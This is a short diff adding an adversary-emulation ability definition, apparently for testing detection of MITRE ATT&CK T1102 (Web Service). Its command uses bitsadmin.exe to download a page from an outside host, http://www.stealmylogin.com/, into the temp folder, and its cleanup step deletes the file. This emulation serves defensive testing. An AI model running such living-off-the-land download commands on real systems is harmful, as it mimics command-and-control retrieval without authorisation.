@@ -1,0 +1,16 @@
+---
+
+- id: tacmulti-1102-AR00-1v00-200121075650
+  name: Reach out to C2 Pointer URLs via command_prompt
+  description: .      Download data from a public website using command line
+  tactic: multiple
+  technique:
+    attack_id: T1102
+    name: Web Service
+  platforms:
+    windows:
+      cmd:
+        command: |
+          bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
+        cleanup: |
+          del %TEMP%\bitsadmindownload.html
